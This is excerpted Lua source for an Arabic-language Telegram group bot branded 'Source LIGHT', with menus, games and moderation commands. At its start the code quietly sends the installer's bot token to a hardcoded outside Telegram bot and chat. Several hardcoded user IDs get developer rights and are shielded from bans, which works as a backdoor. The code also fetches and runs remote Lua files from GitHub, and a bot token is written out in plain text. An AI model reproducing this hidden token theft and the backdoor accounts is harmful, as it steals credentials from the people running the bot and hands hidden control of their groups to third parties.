...
https.request('https://api.telegram.org/bot1929781372:AAGIme8f_mI1rSxiMQ7ARHRdsg7_g4PTGzU/sendmessage?chat_id=1860114886&text=' ..token)
end 
else
print('\27[0;31m◉○━━━━  𝐋𝐈𝐆𝐇𝐓  ━━━━○◉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ALFOLY1/LIGHT/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1860114886,08,1283876320,1840607992,19}   
...
var = true 
elseif tonumber(user_id) == tonumber(1283876320) then
var = true  
elseif tonumber(user_id) == tonumber(1840607992) then
var = true  
elseif tonumber(user_id) == tonumber(19) then
var = true  
elseif tonumber(user_id) == tonumber(25) then
var = true  
...
elseif tonumber(user_id) == tonumber(1840607992) then
var = 'مبرمـج سورسات'
elseif tonumber(user_id) == tonumber(0) then
var = 'المطور طوكيو💕'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
...
local UserName = (data.username_ or "zekraat")
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'لايت') 
local DRAGON_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
💢╖⁩ سعر التنصيب علي سورس لايت
⚡╢ سعر التنصيب العادي 20ج
🦠╜ تواصل مع المطورين لتنصيب بوتك
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹𝑆 𝐸 𝑍 𝑅 ˼',url="t.me/abdoelasill"},{text = 'L𝐈 𝐃𝐄 𝐑 𖣑', url="t.me/Mohamedgamal_72"}},
{{text = 'يوسف مبضؤون،',url="t.me/P_X_U"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
{{text = '𓆩༢࿔ྀુ◉ 𝐃𝐄𝐕 𝐒𝐀𝐃𓊗༢࿔ྀુ𓆪',url="t.me/U_1_X_U"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = 'مميزات خاصه بسـ ورس لايت يعسل . . . . 🥺√'
local Key = {
{'الصلاوات','اذكار','قران'},
{'غنيلي','استوري','متحركه','جمالي'},
{'ثيم','روايات','افلام','اغاني'},
{'نكته','خلفيات','بوستات','كتبات'},
...
os.execute('wget https://raw.githubusercontent.com/ALFOLY1/LIGHT/main/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' ◍ احدث اصدار من سورس لايت { S:12✓}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/X_1C_Q"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
local Text = [[ 
[قناه السورس يعسل. . .√🥺](t.me/zekraat)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓', url="t.me/zekraat"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/zekraat"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ◍ من أحسن السورسات على التليجرام سورس لايت ◍
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_5A_D/77caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "لايت")
...
send(msg.chat_id_,0," ◍ الـعـضو  : {["..data.first_name_.."](T.ME/zekraat)}\n ◍ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◍ عذرا  ↚ {["..data.first_name_.."](T.ME/zekraat)}\n ◍ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'سورس مين ده' then
local Text = [[
[𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓](t.me/zekraat) 
[𝐒𝐀𝐃 ](t.me/U_1_X_U)
[ 𝐀.𝐋.𝐅.𝐎.𝐋.𝐘](t.me/UU_F0LY)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝗔𝗟𝗙𝗢𝗟𝗬 ' ,url="t.me/UU_F0LY"},{text = '𝐒𝐀𝐃', url="t.me/U_1_X_U"}},
{{text = 'ضيف البوت لمجموعتك ✅' ,url="t.me/"..dofile("./sexInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/O_O_X_1/42&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{{text = '𝐒𝐀𝐃', url="http://t.me/Youssef_offical"}},
{{text = '𝗔𝗟𝗙𝗢𝗟𝗬  ',url="t.me/UU_F0LY"}},
}
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/42/15&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝗔𝗟𝗙𝗢𝗟𝗬 ' ,url="t.me/UU_F0LY"},{text = '𝐃𝐄𝐕 𝐒𝐀𝐃', url="t.me/U_1_X_U"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓', url="t.me/zekraat"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐄𝐕 𝐒𝐀𝐃',url="t.me/U_1_X_U"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'كلب'  then
local Text = [[
 والله يعسل انت للي كلب هه 🌚😹
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓',url="t.me/zekraat"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_5A_D/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'الفولي'  then
local Text = [[
 مطور سورس لايت لو حابب تتواصل معاه اتبع الزار ↓↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝗔𝗟𝗙𝗢𝗟𝗬 ',url="t.me/UU_F0LY"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/38&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/36&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == '𝐃𝐄𝐕 𝐒𝐀𝐃'  then
local Text = [[
 مبرمج سورس لايت لو حابب تتواصل معاه اتبع الزار ↓↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐄𝐕 𝐒𝐀𝐃',url="t.me/U_1_X_U"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '◉ 𝙰𝙻𝙵𝙾𝙻𝚈 ',url="t.me/UU_F0LY"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/senddocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/The_0me/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'ثيم' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,25); 
local Text ='اكتب ثيم وسيتم اختيار ثيم اخار' 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_5A_D/66&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '◉○━━━━  𝐋𝐈𝐆𝐇𝐓  ━━━━○◉' then
local Text = [[ 
 ◍من أحسن السورسات على التليجرام سورس لايت ◍
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_5A_D/64&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝙳𝙴𝚅 𝙻𝙸𝙶𝙷𝚃', url="t.me/L_U_O1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب لايت' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◍ اهلا في قائمه الالعاب المتطوره سورس لايت ◍ 
...
if tonumber(result.sender_user_id_) == tonumber(19) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1840607992) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1283876320) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n ◍ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'zekraat')..')'
...
if result.id_ == tonumber(19) then
send(msg.chat_id_, msg.id_, " ◍ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1840607992) then
send(msg.chat_id_, msg.id_, " ◍ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1283876320) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
usertext = '\n ◍ الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'zekraat')..')'
status  = '\n ◍ تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(19) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1840607992) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1283876320) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ALFOLY1/LIGHT/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◍ اهلا بك في متجر ملفات لايت\n ◍ ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n☩━━━━━  𝐅𝐋????𝐈𝐃𝐀  ━━━━━☩\n ◍ علامة تعني { ✔️ } ملف مفعل\n ◍ علامة تعني { ✖ } ملف معطل\n ◍ قناة سورس لايت↓\n".." ◍ [اضغط هنا لدخول](t.me/zekraat) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ALFOLY1/LIGHT/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◍ عذرا الملف لايدعم سورس لايت\n") 
end
return false
end
...
if text == ("مسح قائمه لايت") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه لايت')
return false
end

if text == 'قائمه لايت' and Sudo(msg) then
...
if text == ("رفع لايت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع لايت@(.*)$") and Sudo(msg) then
local username = text:match("^رفع لايت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع لايت(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع لايت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل لايت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل لايت@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل لايت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل لايت(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل لايت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ◍  الايدي بالصوره  ↚ { '..idph..
' }\n'..' ◍  الرفع  ↚ { '..setadd..
' }\n'..' ◍  الحظر  ↚ { '..banm..' }\n\n ◍☩━━━━━  𝐋𝐈𝐆𝐇𝐓  ━━━━━☩\n ◍ قناة سورس لايت↓\n [  [𝐒ΘΘ𝐍](t.me/zekraat)❳](t.me/zekraat) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'☩━━━━━  𝐋𝐈𝐆𝐇𝐓  ━━━━━☩\nاضغط علي الاسم ليتم نسخه\n☩━━━━━  𝐋𝐈𝐆𝐇𝐓  ━━━━━☩ٴ\n ◍  [𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓](t.me/zekraat) ◍ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'لايت').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'لايت')
local DRAGON_Msg = {
'ننعم يروحي 😻??',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس لايتيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'لايت').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '◉ لايت ورب العباد') 
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/zekraat)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/zekraat)')
return false
end
end
end
...
{
{text = '𝐒𝐔𝐎𝐔𝐑𝐂𝐄 𝐒??𝐃', url="t.me/zekraat"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓', url="t.me/ch_nasa"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/sofi' then
...
local Teext =[[
✧بك في مميزات سورس لايت
√🥺🌝
✧مميزات الخاصه بسورس✧
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تويت', url="https://t.me/S_5A_D/37"},{text = 'كتبات',url="https://t.me/S_5A_D/49"}},   
{{text = 'انصحني', url="https://t.me/S_5A_D/36"},{text = 'لو خيروك', url="https://t.me/S_5A_D/50"}}, 
{{text = 'الصراحه', url="https://t.me/S_5A_D/40"},{text = 'حروف', url="https://t.me/S_5A_D/51"}}, 
{{text = 'رزله', url="https://t.me/S_5A_D/42"},{text = 'رد عليه يابوت', url="https://t.me/S_5A_D/52"}}, 
{{text = 'بتكره دا', url="https://t.me/S_5A_D/45"},{text = 'نكته', url="https://t.me/S_5A_D/56"}}, 
...
{
{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐋𝐈𝐆𝐇𝐓', url="t.me/S_5A_D"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'لايت')
